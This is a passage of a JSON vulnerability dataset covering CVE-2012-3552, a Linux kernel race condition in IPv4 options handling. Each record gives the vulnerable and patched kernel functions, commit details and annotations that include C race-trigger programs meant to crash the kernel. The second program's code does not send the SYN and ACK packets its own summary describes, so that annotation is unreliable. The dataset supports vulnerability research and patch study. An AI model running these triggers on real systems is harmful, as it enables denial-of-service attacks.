(free)\n\t\tkfree(ipc.opt);\n\tip_rt_put(rt);\n\nout:\n\tif (err < 0)\n\t\treturn err;\n\treturn len;\n\ndo_confirm:\n\tdst_confirm(&rt->dst);\n\tif (!(msg->msg_flags & MSG_PROBE) || len)\n\t\tgoto back_from_confirm;\n\terr = 0;\n\tgoto done;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in raw socket IPv4 options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: NA\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Data without Synchronization (Race Condition)\n\n[Mandatory] Summary:\nA race condition exists in the Linux kernel's IPv4 raw socket implementation, specifically in the `raw_sendmsg()` function in `net/ipv4/raw.c`. The vulnerability occurs when one thread sends a packet through a raw socket while another thread concurrently modifies the socket's IP options via setsockopt(). The code accesses the `inet->opt` pointer without proper synchronization, allowing another thread to free the old IP options structure while the sending thread is still referencing it. This leads to use-after-free conditions and slab corruption, resulting in a kernel crash.\n\n[Mandatory] Root cause:\nThe `inet->opt` pointer is accessed and read without RCU (Read-Copy-Update) protection, allowing concurrent modification by another thread executing setsockopt() while `raw_sendmsg()` is reading the same pointer.\n\n[Mandatory] Attack Surface:\nNetwork stack, raw socket layer, kernel memory management\n\n[Mandatory] Impact Summary:\nDenial of service via kernel crash and slab corruption\n\n[Optional] Trigger / Attack vector:\nRaw socket sendmsg() operation concurrent with setsockopt() IP_OPTIONS call\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (!ipc.opt)\n    ipc.opt = inet->opt;\n\nif (ipc.opt) {\n    err = -EINVAL;\n    if (inet->hdrincl)\n        goto done;\n    if (ipc.opt->srr) {\n        if (!daddr)\n            goto done;\n        daddr = ipc.opt->faddr;\n    }\n}\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nRaw socket sendmsg() API concurrent with setsockopt() syscall\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free read of kernel memory structure; slab corruption via freed object reuse\n\n[Mandatory] Exploitability summary (1 sentence):\nAn attacker can trigger the race by rapidly alternating sendmsg() and setsockopt() calls from multiple threads, causing slab corruption and kernel panic with moderate reliability.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a raw socket (AF_INET, IPPROTO_RAW)\n- Spawn two threads: one continuously calls sendmsg() with crafted packets, the other repeatedly modifies IP options via setsockopt(IP_OPTIONS, ...)\n- The race window occurs when sendmsg() reads inet->opt pointer while setsockopt() frees the old options and allocates a new one\n- Corrupted kernel memory structure is dereferenced during IP options processing in ip_append_data()\n- Kernel attempts to access freed slab object, triggering crash or triggering slab allocator corruption\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/ip.h>\n#include <arpa/inet.h>\n\nint sock;\nvolatile int stop_flag = 0;\n\nvoid *send_thread(void *arg) {\n    struct sockaddr_in addr;\n    char packet[64];\n    \n    memset(&addr, 0, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    addr.sin_port = htons(1234);\n    \n    while (!stop_flag) {\n        sendto(sock, packet, sizeof(packet), 0, \n               (struct sockaddr *)&addr, sizeof(addr));\n    }\n    return NULL;\n}\n\nvoid *option_thread(void *arg) {\n    unsigned char opts[40];\n    \n    memset(opts, 0, sizeof(opts));\n    while (!stop_flag) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, NULL, 0);\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t t1, t2;\n    \n    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\n    if (sock < 0) { perror(\"socket\"); return 1; }\n    \n    pthread_create(&t1, NULL, send_thread, NULL);\n    pthread_create(&t2, NULL, option_thread, NULL);\n    \n    sleep(5);\n    stop_flag = 1;\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    close(sock);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nif (!ipc.opt) {\n    struct ip_options_rcu *inet_opt;\n\n    rcu_read_lock();\n    inet_opt = rcu_dereference(inet->inet_opt);\n    if (inet_opt) {\n        memcpy(&opt_copy, inet_opt,\n               sizeof(*inet_opt) + inet_opt->opt.optlen);\n        ipc.opt = &opt_copy.opt;\n    }\n    rcu_read_unlock();\n}\n\nif (ipc.opt) {\n    err = -EINVAL;\n    if (inet->hdrincl)\n        goto done;\n    if (ipc.opt->opt.srr) {\n        if (!daddr)\n            goto done;\n        daddr = ipc.opt->opt.faddr;\n    }\n}\n```\n\n[Mandatory] Fix summary:\nThe patch protects access to `inet->opt` using RCU (Read-Copy-Update) synchronization with `rcu_read_lock()`/`rcu_read_unlock()` and `rcu_dereference()`. A local copy of the IP options structure is made into a stack-allocated `opt_copy` buffer to eliminate the use-after-free race while allowing concurrent setsockopt() modifications.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259 (\"inet: add RCU protection to inet->opt\")\n\n[Optional] Patch Analysis:\nThe fix added RCU synchronization to protect the inet->opt pointer and introduced a local stack-allocated copy mechanism, eliminating the race condition by ensuring the sending function always operates on a consistent copy of IP options.\n\nPatchType: Synchronization primitive added (RCU lock/unlock); data structure copy for safe concurrent access\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other socket option handlers (TCP, UDP) for similar unsynchronized option pointer accesses\n- Analyze IP multicast option handling paths for comparable race conditions in ipc.opt assignments\n- Diff related kernel versions to identify if similar races exist in other network protocol families (IPv6, raw socket variants)\n\n[Optional] Likely variants/impact (one line):\nSimilar races may exist in UDP sendmsg(), IPv6 raw socket handling, and other protocol handlers that access shared socket option structures without RCU protection.",
        "tests": "NA",
        "solutions": "static int raw_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,\n\t\t       size_t len)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ipcm_cookie ipc;\n\tstruct rtable *rt = NULL;\n\tint free = 0;\n\t__be32 daddr;\n \t__be32 saddr;\n \tu8  tos;\n \tint err;\n\tstruct ip_options_data opt_copy;\n \n \terr = -EMSGSIZE;\n \tif (len > 0xFFFF)\n\t\tgoto out;\n\n\t/*\n\t *\tCheck the flags.\n\t */\n\n\terr = -EOPNOTSUPP;\n\tif (msg->msg_flags & MSG_OOB)\t/* Mirror BSD error message */\n\t\tgoto out;               /* compatibility */\n\n\t/*\n\t *\tGet and verify the address.\n\t */\n\n\tif (msg->msg_namelen) {\n\t\tstruct sockaddr_in *usin = (struct sockaddr_in *)msg->msg_name;\n\t\terr = -EINVAL;\n\t\tif (msg->msg_namelen < sizeof(*usin))\n\t\t\tgoto out;\n\t\tif (usin->sin_family != AF_INET) {\n\t\t\tstatic int complained;\n\t\t\tif (!complained++)\n\t\t\t\tprintk(KERN_INFO \"%s forgot to set AF_INET in \"\n\t\t\t\t\t\t \"raw sendmsg. Fix it!\\n\",\n\t\t\t\t\t\t current->comm);\n\t\t\terr = -EAFNOSUPPORT;\n\t\t\tif (usin->sin_family)\n\t\t\t\tgoto out;\n\t\t}\n\t\tdaddr = usin->sin_addr.s_addr;\n\t\t/* ANK: I did not forget to get protocol from port field.\n\t\t * I just do not know, who uses this weirdness.\n\t\t * IP_HDRINCL is much more convenient.\n\t\t */\n\t} else {\n\t\terr = -EDESTADDRREQ;\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\tgoto out;\n\t\tdaddr = inet->inet_daddr;\n\t}\n\n\tipc.addr = inet->inet_saddr;\n\tipc.opt = NULL;\n\tipc.tx_flags = 0;\n\tipc.oif = sk->sk_bound_dev_if;\n\n\tif (msg->msg_controllen) {\n\t\terr = ip_cmsg_send(sock_net(sk), msg, &ipc);\n\t\tif (err)\n\t\t\tgoto out;\n\t\tif (ipc.opt)\n\t\t\tfree = 1;\n\t}\n\n \tsaddr = ipc.addr;\n \tipc.addr = daddr;\n \n\tif (!ipc.opt) {\n\t\tstruct ip_options_rcu *inet_opt;\n\n\t\trcu_read_lock();\n\t\tinet_opt = rcu_dereference(inet->inet_opt);\n\t\tif (inet_opt) {\n\t\t\tmemcpy(&opt_copy, inet_opt,\n\t\t\t       sizeof(*inet_opt) + inet_opt->opt.optlen);\n\t\t\tipc.opt = &opt_copy.opt;\n\t\t}\n\t\trcu_read_unlock();\n\t}\n \n \tif (ipc.opt) {\n \t\terr = -EINVAL;\n\t\t/* Linux does not mangle headers on raw sockets,\n\t\t * so that IP options + IP_HDRINCL is non-sense.\n \t\t */\n \t\tif (inet->hdrincl)\n \t\t\tgoto done;\n\t\tif (ipc.opt->opt.srr) {\n \t\t\tif (!daddr)\n \t\t\t\tgoto done;\n\t\t\tdaddr = ipc.opt->opt.faddr;\n \t\t}\n \t}\n \ttos = RT_CONN_FLAGS(sk);\n\tif (msg->msg_flags & MSG_DONTROUTE)\n\t\ttos |= RTO_ONLINK;\n\n\tif (ipv4_is_multicast(daddr)) {\n\t\tif (!ipc.oif)\n\t\t\tipc.oif = inet->mc_index;\n\t\tif (!saddr)\n\t\t\tsaddr = inet->mc_addr;\n\t}\n\n\t{\n\t\tstruct flowi4 fl4;\n\n\t\tflowi4_init_output(&fl4, ipc.oif, sk->sk_mark, tos,\n\t\t\t\t   RT_SCOPE_UNIVERSE,\n\t\t\t\t   inet->hdrincl ? IPPROTO_RAW : sk->sk_protocol,\n\t\t\t\t   FLOWI_FLAG_CAN_SLEEP, daddr, saddr, 0, 0);\n\n\t\tif (!inet->hdrincl) {\n\t\t\terr = raw_probe_proto_opt(&fl4, msg);\n\t\t\tif (err)\n\t\t\t\tgoto done;\n\t\t}\n\n\t\tsecurity_sk_classify_flow(sk, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_flow(sock_net(sk), &fl4, sk);\n\t\tif (IS_ERR(rt)) {\n\t\t\terr = PTR_ERR(rt);\n\t\t\trt = NULL;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\terr = -EACCES;\n\tif (rt->rt_flags & RTCF_BROADCAST && !sock_flag(sk, SOCK_BROADCAST))\n\t\tgoto done;\n\n\tif (msg->msg_flags & MSG_CONFIRM)\n\t\tgoto do_confirm;\nback_from_confirm:\n\n\tif (inet->hdrincl)\n\t\terr = raw_send_hdrinc(sk, msg->msg_iov, len,\n\t\t\t\t\t&rt, msg->msg_flags);\n\n\t else {\n\t\tif (!ipc.addr)\n\t\t\tipc.addr = rt->rt_dst;\n\t\tlock_sock(sk);\n\t\terr = ip_append_data(sk, ip_generic_getfrag, msg->msg_iov, len, 0,\n\t\t\t\t\t&ipc, &rt, msg->msg_flags);\n\t\tif (err)\n\t\t\tip_flush_pending_frames(sk);\n\t\telse if (!(msg->msg_flags & MSG_MORE)) {\n\t\t\terr = ip_push_pending_frames(sk);\n\t\t\tif (err == -ENOBUFS && !inet->recverr)\n\t\t\t\terr = 0;\n\t\t}\n\t\trelease_sock(sk);\n\t}\ndone:\n\tif (free)\n\t\tkfree(ipc.opt);\n\tip_rt_put(rt);\n\nout:\n\tif (err < 0)\n\t\treturn err;\n\treturn len;\n\ndo_confirm:\n\tdst_confirm(&rt->dst);\n\tif (!(msg->msg_flags & MSG_PROBE) || len)\n\t\tgoto back_from_confirm;\n\terr = 0;\n\tgoto done;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/syncookies.c": "struct sock *cookie_v4_check(struct sock *sk, struct sk_buff *skb,\n\t\t\t     struct ip_options *opt)\n{\n\tstruct tcp_options_received tcp_opt;\n\tu8 *hash_location;\n\tstruct inet_request_sock *ireq;\n\tstruct tcp_request_sock *treq;\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tconst struct tcphdr *th = tcp_hdr(skb);\n\t__u32 cookie = ntohl(th->ack_seq) - 1;\n\tstruct sock *ret = sk;\n\tstruct request_sock *req;\n\tint mss;\n\tstruct rtable *rt;\n\t__u8 rcv_wscale;\n\tbool ecn_ok;\n\n\tif (!sysctl_tcp_syncookies || !th->ack || th->rst)\n\t\tgoto out;\n\n\tif (tcp_synq_no_recent_overflow(sk) ||\n\t    (mss = cookie_check(skb, cookie)) == 0) {\n\t\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_SYNCOOKIESFAILED);\n\t\tgoto out;\n\t}\n\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_SYNCOOKIESRECV);\n\n\t/* check for timestamp cookie support */\n\tmemset(&tcp_opt, 0, sizeof(tcp_opt));\n\ttcp_parse_options(skb, &tcp_opt, &hash_location, 0);\n\n\tif (!cookie_check_timestamp(&tcp_opt, &ecn_ok))\n\t\tgoto out;\n\n\tret = NULL;\n\treq = inet_reqsk_alloc(&tcp_request_sock_ops); /* for safety */\n\tif (!req)\n\t\tgoto out;\n\n\tireq = inet_rsk(req);\n\ttreq = tcp_rsk(req);\n\ttreq->rcv_isn\t\t= ntohl(th->seq) - 1;\n\ttreq->snt_isn\t\t= cookie;\n\treq->mss\t\t= mss;\n\tireq->loc_port\t\t= th->dest;\n\tireq->rmt_port\t\t= th->source;\n\tireq->loc_addr\t\t= ip_hdr(skb)->daddr;\n\tireq->rmt_addr\t\t= ip_hdr(skb)->saddr;\n\tireq->ecn_ok\t\t= ecn_ok;\n\tireq->snd_wscale\t= tcp_opt.snd_wscale;\n\tireq->sack_ok\t\t= tcp_opt.sack_ok;\n\tireq->wscale_ok\t\t= tcp_opt.wscale_ok;\n\tireq->tstamp_ok\t\t= tcp_opt.saw_tstamp;\n\treq->ts_recent\t\t= tcp_opt.saw_tstamp ? tcp_opt.rcv_tsval : 0;\n\n\t/* We throwed the options of the initial SYN away, so we hope\n \t * the ACK carries the same options again (see RFC1122 4.2.3.8)\n \t */\n \tif (opt && opt->optlen) {\n\t\tint opt_size = sizeof(struct ip_options) + opt->optlen;\n \n \t\tireq->opt = kmalloc(opt_size, GFP_ATOMIC);\n\t\tif (ireq->opt != NULL && ip_options_echo(ireq->opt, skb)) {\n \t\t\tkfree(ireq->opt);\n \t\t\tireq->opt = NULL;\n \t\t}\n\t}\n\n\tif (security_inet_conn_request(sk, skb, req)) {\n\t\treqsk_free(req);\n\t\tgoto out;\n\t}\n\n\treq->expires\t= 0UL;\n\treq->retrans\t= 0;\n\n\t/*\n\t * We need to lookup the route here to get at the correct\n\t * window size. We should better make sure that the window size\n\t * hasn't changed since we received the original syn, but I see\n\t * no easy way to do this.\n\t */\n\t{\n\t\tstruct flowi4 fl4;\n\n\t\tflowi4_init_output(&fl4, 0, sk->sk_mark, RT_CONN_FLAGS(sk),\n\t\t\t\t   RT_SCOPE_UNIVERSE, IPPROTO_TCP,\n\t\t\t\t   inet_sk_flowi_flags(sk),\n\t\t\t\t   (opt && opt->srr) ? opt->faddr : ireq->rmt_addr,\n\t\t\t\t   ireq->loc_addr, th->source, th->dest);\n\t\tsecurity_req_classify_flow(req, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_key(sock_net(sk), &fl4);\n\t\tif (IS_ERR(rt)) {\n\t\t\treqsk_free(req);\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\t/* Try to redo what tcp_v4_send_synack did. */\n\treq->window_clamp = tp->window_clamp ? :dst_metric(&rt->dst, RTAX_WINDOW);\n\n\ttcp_select_initial_window(tcp_full_space(sk), req->mss,\n\t\t\t\t  &req->rcv_wnd, &req->window_clamp,\n\t\t\t\t  ireq->wscale_ok, &rcv_wscale,\n\t\t\t\t  dst_metric(&rt->dst, RTAX_INITRWND));\n\n\tireq->rcv_wscale  = rcv_wscale;\n\n\tret = get_cookie_sock(sk, skb, req, &rt->dst);\nout:\treturn ret;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in TCP SYN cookie IP options processing\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: commit f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Affected products/versions:\nLinux kernel before version 3.0\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (race condition)\nCVE-2012-3552: Race condition in IP options handling during SYN cookie validation\n\n[Mandatory] Summary:\nThe vulnerability is a race condition in the cookie_v4_check() function (net/ipv4/syncookies.c) where the function accesses and duplicates the inet->opt (ip_options) structure without proper RCU synchronization. When a concurrent thread modifies socket options via setsockopt() while cookie_v4_check() is processing an ACK packet during SYN cookie validation, a use-after-free or double-free condition occurs. This causes slab corruption and kernel panic, resulting in a denial of service against applications that set socket options during network traffic handling.\n\n[Mandatory] Root cause:\nMissing RCU (Read-Copy-Update) protection and synchronization primitives when accessing and copying the inet->opt pointer during TCP SYN cookie validation, allowing concurrent modification by another thread to free the structure while it is being read or copied.\n\n[Mandatory] Attack Surface:\nLinux kernel network stack, TCP SYN cookie processing path (syncookies.c)\n\n[Mandatory] Impact Summary:\nDenial of service (slab corruption and system crash)\n\n[Optional] Trigger / Attack vector:\nRemote attacker sends crafted SYN and ACK packets to trigger SYN cookie validation while a local thread concurrently modifies socket options on the target socket.\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (opt && opt->optlen) {\n    int opt_size = sizeof(struct ip_options) + opt->optlen;\n    ireq->opt = kmalloc(opt_size, GFP_ATOMIC);\n    if (ireq->opt != NULL && ip_options_echo(ireq->opt, skb)) {\n        kfree(ireq->opt);\n        ireq->opt = NULL;\n    }\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nNetwork packet reception during TCP SYN cookie validation; concurrent socket option modification (setsockopt syscall)\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free / double-free on ip_options structure in kernel memory\n\n[Mandatory] Exploitability summary (1 sentence):\nThe exploit is moderately difficult; it requires precise timing to race between network packet processing (ACK with SYN cookie) and concurrent setsockopt() calls to trigger memory corruption without crashing prematurely.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a listening socket and set IP socket options via setsockopt()\n- Send a crafted SYN packet to the target, triggering SYN cookie generation\n- Send a corresponding ACK packet with valid SYN cookie to initiate cookie_v4_check()\n- While packet processing is in progress, spawn a thread to rapidly modify/clear socket options\n- Race condition causes ip_options_echo() to reference freed or reallocated memory\n- Kernel accesses corrupted memory, triggering panic or slab corruption\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/ip.h>\n#include <netinet/tcp.h>\n#include <arpa/inet.h>\n\nstruct ip_options opts;\nint race_socket;\n\nvoid *race_thread(void *arg) {\n    unsigned char opt_data[40] = {0};\n    while (1) {\n        setsockopt(race_socket, IPPROTO_IP, IP_OPTIONS, opt_data, sizeof(opt_data));\n        setsockopt(race_socket, IPPROTO_IP, IP_OPTIONS, NULL, 0);\n    }\n    return NULL;\n}\n\nint main() {\n    struct sockaddr_in addr;\n    pthread_t tid;\n    \n    race_socket = socket(AF_INET, SOCK_STREAM, 0);\n    memset(&addr, 0, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(8000);\n    inet_pton(AF_INET, \"127.0.0.1\", &addr.sin_addr);\n    bind(race_socket, (struct sockaddr*)&addr, sizeof(addr));\n    listen(race_socket, 1);\n    \n    unsigned char opt_data[40] = {68, 4, 3, 8};\n    setsockopt(race_socket, IPPROTO_IP, IP_OPTIONS, opt_data, sizeof(opt_data));\n    \n    pthread_create(&tid, NULL, race_thread, NULL);\n    sleep(10);\n    \n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nif (opt && opt->optlen) {\n    int opt_size = sizeof(struct ip_options_rcu) + opt->optlen;\n    ireq->opt = kmalloc(opt_size, GFP_ATOMIC);\n    if (ireq->opt != NULL && ip_options_echo(&ireq->opt->opt, skb)) {\n        kfree(ireq->opt);\n        ireq->opt = NULL;\n    }\n}\n```\n\n[Mandatory] Fix summary:\nThe patch wraps the ip_options structure in a new ip_options_rcu container and adds RCU (Read-Copy-Update) synchronization to protect inet->opt. The code now accesses ip_options through the RCU-protected wrapper, preventing use-after-free when socket options are concurrently modified.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nMessage: \"inet: add RCU protection to inet->opt\"\nLink: https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nThe fix changed the ip_options allocation and access pattern by introducing struct ip_options_rcu as a container. Instead of directly storing a pointer to ip_options, the new structure wraps it with RCU semantics, allowing readers to safely access the options under RCU lock while writers use copy-on-write semantics. The key change is `ip_options_echo(&ireq->opt->opt, skb)` which accesses the nested ip_options member within the RCU-protected wrapper.\n\nPatchType: Race condition fix via RCU synchronization; data structure refactoring to add RCU protection\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Audit other socket option handling paths in net/ipv4/ and net/ipv6/ for similar unprotected concurrent access patterns, particularly in connection establishment flows (tcp_v4_syn_recv_sock, tcp_v6_syn_recv_sock)\n- Review all callers of ip_setup_cork() and ip_make_skb() for potential races where inet->opt is read without RCU protection\n- Fuzz SYN cookie handling with concurrent setsockopt() calls to detect similar timing-dependent vulnerabilities\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions may exist in IPv6 path or other TCP option handling code that accesses inet->opt without RCU synchronization.",
        "tests": "NA",
        "solutions": "struct sock *cookie_v4_check(struct sock *sk, struct sk_buff *skb,\n\t\t\t     struct ip_options *opt)\n{\n\tstruct tcp_options_received tcp_opt;\n\tu8 *hash_location;\n\tstruct inet_request_sock *ireq;\n\tstruct tcp_request_sock *treq;\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tconst struct tcphdr *th = tcp_hdr(skb);\n\t__u32 cookie = ntohl(th->ack_seq) - 1;\n\tstruct sock *ret = sk;\n\tstruct request_sock *req;\n\tint mss;\n\tstruct rtable *rt;\n\t__u8 rcv_wscale;\n\tbool ecn_ok;\n\n\tif (!sysctl_tcp_syncookies || !th->ack || th->rst)\n\t\tgoto out;\n\n\tif (tcp_synq_no_recent_overflow(sk) ||\n\t    (mss = cookie_check(skb, cookie)) == 0) {\n\t\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_SYNCOOKIESFAILED);\n\t\tgoto out;\n\t}\n\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_SYNCOOKIESRECV);\n\n\t/* check for timestamp cookie support */\n\tmemset(&tcp_opt, 0, sizeof(tcp_opt));\n\ttcp_parse_options(skb, &tcp_opt, &hash_location, 0);\n\n\tif (!cookie_check_timestamp(&tcp_opt, &ecn_ok))\n\t\tgoto out;\n\n\tret = NULL;\n\treq = inet_reqsk_alloc(&tcp_request_sock_ops); /* for safety */\n\tif (!req)\n\t\tgoto out;\n\n\tireq = inet_rsk(req);\n\ttreq = tcp_rsk(req);\n\ttreq->rcv_isn\t\t= ntohl(th->seq) - 1;\n\ttreq->snt_isn\t\t= cookie;\n\treq->mss\t\t= mss;\n\tireq->loc_port\t\t= th->dest;\n\tireq->rmt_port\t\t= th->source;\n\tireq->loc_addr\t\t= ip_hdr(skb)->daddr;\n\tireq->rmt_addr\t\t= ip_hdr(skb)->saddr;\n\tireq->ecn_ok\t\t= ecn_ok;\n\tireq->snd_wscale\t= tcp_opt.snd_wscale;\n\tireq->sack_ok\t\t= tcp_opt.sack_ok;\n\tireq->wscale_ok\t\t= tcp_opt.wscale_ok;\n\tireq->tstamp_ok\t\t= tcp_opt.saw_tstamp;\n\treq->ts_recent\t\t= tcp_opt.saw_tstamp ? tcp_opt.rcv_tsval : 0;\n\n\t/* We throwed the options of the initial SYN away, so we hope\n \t * the ACK carries the same options again (see RFC1122 4.2.3.8)\n \t */\n \tif (opt && opt->optlen) {\n\t\tint opt_size = sizeof(struct ip_options_rcu) + opt->optlen;\n \n \t\tireq->opt = kmalloc(opt_size, GFP_ATOMIC);\n\t\tif (ireq->opt != NULL && ip_options_echo(&ireq->opt->opt, skb)) {\n \t\t\tkfree(ireq->opt);\n \t\t\tireq->opt = NULL;\n \t\t}\n\t}\n\n\tif (security_inet_conn_request(sk, skb, req)) {\n\t\treqsk_free(req);\n\t\tgoto out;\n\t}\n\n\treq->expires\t= 0UL;\n\treq->retrans\t= 0;\n\n\t/*\n\t * We need to lookup the route here to get at the correct\n\t * window size. We should better make sure that the window size\n\t * hasn't changed since we received the original syn, but I see\n\t * no easy way to do this.\n\t */\n\t{\n\t\tstruct flowi4 fl4;\n\n\t\tflowi4_init_output(&fl4, 0, sk->sk_mark, RT_CONN_FLAGS(sk),\n\t\t\t\t   RT_SCOPE_UNIVERSE, IPPROTO_TCP,\n\t\t\t\t   inet_sk_flowi_flags(sk),\n\t\t\t\t   (opt && opt->srr) ? opt->faddr : ireq->rmt_addr,\n\t\t\t\t   ireq->loc_addr, th->source, th->dest);\n\t\tsecurity_req_classify_flow(req, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_key(sock_net(sk), &fl4);\n\t\tif (IS_ERR(rt)) {\n\t\t\treqsk_free(req);\n\t\t\tgoto out;\n\t\t}\n\t}\n\n\t/* Try to redo what tcp_v4_send_synack did. */\n\treq->window_clamp = tp->window_clamp ? :dst_metric(&rt->dst, RTAX_WINDOW);\n\n\ttcp_select_initial_window(tcp_full_space(sk), req->mss,\n\t\t\t\t  &req->rcv_wnd, &req->window_clamp,\n\t\t\t\t  ireq->wscale_ok, &rcv_wscale,\n\t\t\t\t  dst_metric(&rt->dst, RTAX_INITRWND));\n\n\tireq->rcv_wscale  = rcv_wscale;\n\n\tret = get_cookie_sock(sk, skb, req, &rt->dst);\nout:\treturn ret;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
